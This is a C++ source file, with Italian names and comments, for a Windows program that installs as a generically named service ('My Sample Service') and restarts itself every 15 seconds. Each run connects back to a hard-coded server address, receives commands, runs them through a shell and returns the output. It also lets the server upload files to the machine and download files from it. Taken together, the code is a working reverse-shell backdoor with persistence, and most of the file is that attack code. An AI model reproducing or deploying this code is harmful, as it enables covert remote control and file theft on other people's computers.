// FirstService.cpp: definisce il punto di ingresso dell'applicazione console.
//
// FirstService.cpp: definisce il punto di ingresso dell'applicazione console.
//
#include "stdafx.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <strsafe.h>
#include <direct.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "advapi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_SERVER "127.0.0.1"
#define DEFAULT_PORT "27015"
#define CYCLING_TIME 15000

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

void mainConnessioneAlServer();
void invia(SOCKET socketConnessione, char* messaggio);
char* riceviStringa(SOCKET socketConnessione, char *recvbuf);
void inizializzaConnessione(SOCKET *ConnectSocket);
void chiudiConnessione(SOCKET ConnectSocket);

int ottieniComando(char *comando);
void setCartellaCorrente(char* path, char* dirCorrente);
void getCartellaCorrente(char* temp);

//void test();

#define SERVICE_NAME  _T("My Sample Service")

int _tmain(int argc, char *argv[])
{
	//In this case the main service is creating subprocess to handle the real job of the application.
	if (argc != 1) {
		/*
			In this case client need to be started. The service periodically call this function.
			At the end the function called will end the process, so there should be no return.
		*/
		if (argv[1][0] == 'c') {
			mainConnessioneAlServer();
		}else if (argv[1][0] == 't') {
			//test();
		}
	}
	// In this case is the main service starting.
	else {
		SERVICE_TABLE_ENTRY ServiceTable[] =
		{
			{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
			{ NULL, NULL }
		};

		if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
		{
			return GetLastError();
		}
	}

	return 0;
}

/*
	Main function to manage connection to the remote server.
*/
void mainConnessioneAlServer() {
	//Used for connection
	SOCKET socketConnessione = INVALID_SOCKET;

	//User for shell control
	char path[DEFAULT_BUFLEN], comando[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
	FILE *read;

	inizializzaConnessione(&socketConnessione);

	getCartellaCorrente(path);

	while (true) {
		//send
		invia(socketConnessione, path);
		invia(socketConnessione, "end");

		//recive
		riceviStringa(socketConnessione, comando);
		printf("\n[RCV]: %s\n\n", comando);
		int cmdN = ottieniComando(comando);
		if (cmdN == 1) {	  //Change Dir
			setCartellaCorrente(comando, path);
		}
		else if (cmdN == 2) { //Upload to client
			char* fileName = &comando[3];
			FILE *file;
			int e = fopen_s(&file, fileName, "a");
			if (e == 0) {
				invia(socketConnessione, "Per ora è possibile mandare solo 512 char senza invio - da migliorare: ");
				invia(socketConnessione, "end");
				riceviStringa(socketConnessione, buffer);
				fputs(buffer, file);
				invia(socketConnessione, "File scritto con successo.");
				fclose(file);
			}
			else {
				invia(socketConnessione, "Impossibile aprire il file");
			}
		}
		else if (cmdN == 3) { //Downlaod from client
			char* fileName = &comando[3];
			FILE *file;
			int e = fopen_s(&file, fileName, "r");
			if (e == 0) {
				invia(socketConnessione, "Inviando il file: ");
				invia(socketConnessione, fileName);
				invia(socketConnessione, "\n");
				while (fgets(buffer, DEFAULT_BUFLEN, file)) {
					invia(socketConnessione, buffer);
				}
				fclose(file);
			}
			else {
				invia(socketConnessione, "Impossibile aprire il file");
			}
		}
		else {
			if ((read = _popen(comando, "rt")) == NULL)
				exit(1);
			while (fgets(buffer, DEFAULT_BUFLEN, read)) {
				invia(socketConnessione, buffer);
				printf(buffer);
			}
			_pclose(read);
		}
	}

	chiudiConnessione(socketConnessione);
}

/*
	Used to check if it's needed to change process working dir.
	IN wchar_t *comando - Command to check.
	Return:
		0 - Standard command
		1 - Change directory command
		2 - Upload file command
		3 - Download file command
*/
int ottieniComando(char *comando) {
	if (strlen(comando) > 3) {
		if (comando[0] == 'c' && comando[1] == 'd') {
			return 1;
		}
		else if (comando[0] == 'u' && comando[1] == 'p') {
			return 2;
		}
		else if (comando[0] == 'd' && comando[1] == 'w') {
			return 3;
		}
	}
	return 0;
}

/*
	To get current directory.
*/
void getCartellaCorrente(char* temp) {
	size_t size;
	LPWSTR dirCorrente = new TCHAR[DEFAULT_BUFLEN];
	GetCurrentDirectory(DEFAULT_BUFLEN, dirCorrente);
	size = wcslen(dirCorrente);
	wcstombs_s(NULL, temp, DEFAULT_BUFLEN, dirCorrente, size);
}

/*
	To change current directory while navigating.
*/
void setCartellaCorrente(char* relative, char* dirCorrente) {

	if (strlen(relative) >= 5 && relative[4] == ':') {
		strcpy_s(dirCorrente, DEFAULT_BUFLEN, &relative[3]);
	}
	else {
		getCartellaCorrente(dirCorrente);
		relative[2] = '\\';
		strcat_s(dirCorrente, DEFAULT_BUFLEN, &relative[2]);
	}
	int i = _chdir(dirCorrente);
	getCartellaCorrente(dirCorrente);
}

/*
	Function used to send message to the server.
	IMPORTANT: If any error comunicating to the server occurs the process will be stopped.
	IN SOCKET socketConnessione - Socket on which the program have to send.
	IN char *messaggio - Buffer used to store the outgoing message.
*/
void invia(SOCKET socketConnessione, char* messaggio) {
	int iResult = send(socketConnessione, messaggio, (int)strlen(messaggio), 0);
	if (iResult == SOCKET_ERROR) {
		printf("\nDEBUG: Error during send\n");
		chiudiConnessione(socketConnessione);
		exit(1);
	}
	printf("[SND]: %s\n", messaggio);
}

/*
	Function used to recive string of max lenght DEFAULT_BUFLEN.
	IMPORTANT: If any error comunicating to the server occurs the process will be stopped.
	IN SOCKET socketConnessione - Socket on which the program have to listen.
	IN char *recvbuff - Buffer used to store the incoming message.
*/
char* riceviStringa(SOCKET socketConnessione, char *recvbuf) {
	recvbuf[0] = '\0';
	int iResult;
	iResult = recv(socketConnessione, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult <= 0) {
		printf("\nDEBUG: Error during recive\n");
		chiudiConnessione(socketConnessione);
		exit(1);
	}
	recvbuf[iResult] = '\0';
	return recvbuf;
}

/*
	Function used to initialize socket connection. Will be called by main function when trying to connect to the remote server.
	IMPORTANT: This fuction return just if no problems appear and the socket is created succesfully, otherwise the process will be stopped.
	IN SOCKET *ConnectSocket - Socket that if the fuction return will have a connection to the server
*/
void inizializzaConnessione(SOCKET *ConnectSocket) {
	WSADATA wsaData;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("\nDEBUG: Error during initializa winsock (%d)\n", iResult);
		exit(1);
	}
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("\nDEBUG: Error while resolving the server address and port (%d)\n", iResult);
		WSACleanup();
		exit(1);
	}
	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		*ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (*ConnectSocket == INVALID_SOCKET) {
			printf("\nDEBUG: Socket error (%ld)\n", WSAGetLastError());
			WSACleanup();
			exit(1);
		}
		// Connect to server.
		iResult = connect(*ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket = INVALID_SOCKET);
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	if (*ConnectSocket == INVALID_SOCKET) {
		printf("\nDEBUG: No connection to server\n");
		WSACleanup();
		exit(1);
	}
	return;
}

/*
	Function using to close a socket connection. It can be called just once initialize return. 
	IN SOCKET *ConnectSocket - Socket to be closed.
*/
void chiudiConnessione(SOCKET ConnectSocket) {
	shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();
}


								/* FUNCTION USED BY SERVICE */


VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv){
	DWORD Status = E_FAIL;
	// Register our service control handler with the SCM
	g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
	if (g_StatusHandle == NULL){
		goto EXIT;
	}
	// Tell the service controller we are starting
	ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;
	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE){
		OutputDebugString(_T(
			"My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}
	/*
	* Perform tasks necessary to start the service here
	*/
	// Create a service stop event to wait on later
	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL){
		// Error creating event
		// Tell service controller we are stopped and exit
		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;
		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE){
			OutputDebugString(_T(
				"My Sample Service: ServiceMain: SetServiceStatus returned error"));
		}
		goto EXIT;
	}
	// Tell the service controller we are started
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;
	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE){
		OutputDebugString(_T(
			"My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}
	// Start a thread that will perform the main task of the service
	HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
	// Wait until our worker thread exits signaling that the service needs to stop
	WaitForSingleObject(hThread, INFINITE);
	// Perform any cleanup tasks
	CloseHandle(g_ServiceStopEvent);
	// Tell the service controller we are stopped
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 3;
	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE){
		OutputDebugString(_T(
			"My Sample Service: ServiceMain: SetServiceStatus returned error"));
	}
EXIT:
	return;
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode){
	switch (CtrlCode){
	case SERVICE_CONTROL_STOP:
		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;
		// Perform tasks necessary to stop the service here
		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 4;
		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE){
			OutputDebugString(_T(
				"My Sample Service: ServiceCtrlHandler: SetServiceStatus returned error"));
		}
		// This will signal the worker thread to start shutting down
		SetEvent(g_ServiceStopEvent);
		break;
	default:
		break;
	}
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam){
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPWSTR lpFilename = new TCHAR[100];
	GetModuleFileName(NULL,lpFilename,100);
	wchar_t test[10];
	wcsncpy_s(test, 10, L" c", 10);
	wcsncat_s(lpFilename, 100, test, _TRUNCATE);
	printf("%ls\n", lpFilename);
	//  Periodically check if the service has been requested to stop
	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0){
		/*
			Perform main service function here, this should run once every 5 minutes.
			It's the main function that tries to connect to the server.
		*/
		if (!CreateProcess(NULL,	// No module name (use command line)
			lpFilename,				// Command line
			NULL,					// Process handle not inheritable
			NULL,					// Thread handle not inheritable
			FALSE,					// Set handle inheritance to FALSE
			0,						// No creation flags
			NULL,					// Use parent's environment block
			NULL,					// Use parent's starting directory 
			&si,					// Pointer to STARTUPINFO structure
			&pi)					// Pointer to PROCESS_INFORMATION structure
			){
			printf("CreateProcess failed (%d).\n", GetLastError());
		}
		// Wait until child process exits.
		WaitForSingleObject(pi.hProcess, INFINITE);
		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		OutputDebugString(_T("My Sample Service: Questo viene mostrato ogni volta che scatta il timer della funzione principale"));
		//  Simulate some work by sleeping
		Sleep(CYCLING_TIME);
	}
	return ERROR_SUCCESS;
}


								/* OLD SHIT I AM AFRAID TO DELETE */


/*
void startConnection() {
WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
struct addrinfo *result = NULL,
*ptr = NULL,
hints;
char *sendbuf = "Ciao, aspetto un comando:";
char *sendaddr = "127.0.0.1";
char recvbuf[DEFAULT_BUFLEN];
int iResult;
int recvbuflen = DEFAULT_BUFLEN;

// Initialize Winsock
iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
//Connection failed
if (iResult != 0) {
printf("WSAStartup failed with error: %d\n", iResult);
return;
}

ZeroMemory(&hints, sizeof(hints));
hints.ai_family = AF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_protocol = IPPROTO_TCP;

// Resolve the server address and port
iResult = getaddrinfo(sendaddr, DEFAULT_PORT, &hints, &result);
//Connection failed
if (iResult != 0) {
printf("getaddrinfo failed with error: %d\n", iResult);
WSACleanup();
return;
}

// Attempt to connect to an address until one succeeds
for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

// Create a SOCKET for connecting to server
ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
ptr->ai_protocol);
if (ConnectSocket == INVALID_SOCKET) {
//Connection failed
printf("socket failed with error: %ld\n", WSAGetLastError());
WSACleanup();
return;
}

// Connect to server.
iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
//Connection failed
if (iResult == SOCKET_ERROR) {
closesocket(ConnectSocket);
ConnectSocket = INVALID_SOCKET;
continue;
}
break;
}

freeaddrinfo(result);

//Connection failed
if (ConnectSocket == INVALID_SOCKET) {
printf("Unable to connect to server!\n");
WSACleanup();
return;
}

iResult = 1;
while (iResult) {
// Send an initial buffer
iResult = send(ConnectSocket, sendbuf, (int)strlen("Ciao, aspetto un comando:"), 0);
//Send failed
if (iResult == SOCKET_ERROR) {
printf("send failed with error: %d\n", WSAGetLastError());
closesocket(ConnectSocket);
WSACleanup();
return;
}
printf("Bytes Sent: %ld\nMessage Sent: %s\n\n", iResult, sendbuf);
iResult = send(ConnectSocket, "end", 3, 0);
//Send failed
if (iResult == SOCKET_ERROR) {
printf("send failed with error: %d\n", WSAGetLastError());
closesocket(ConnectSocket);
WSACleanup();
return;
}

// Receive until the peer closes the connection
do {

iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
if (iResult > 0) {
recvbuf[iResult] = '\0';
printf("Bytes received: %d\nMessage Recived: %s\n", iResult, recvbuf);
}
else if (iResult == 0)
printf("End receive\n");
else
printf("recv failed with error: %d\n", WSAGetLastError());

} while (iResult > 0 && strcmp(recvbuf, "end"));
printf("\n");
}

// shutdown the connection since no more data will be sent
iResult = shutdown(ConnectSocket, SD_SEND);
//Shutdown failed
if (iResult == SOCKET_ERROR) {
printf("shutdown failed with error: %d\n", WSAGetLastError());
closesocket(ConnectSocket);
WSACleanup();
return;
}
// cleanup
closesocket(ConnectSocket);
WSACleanup();

return;
}*/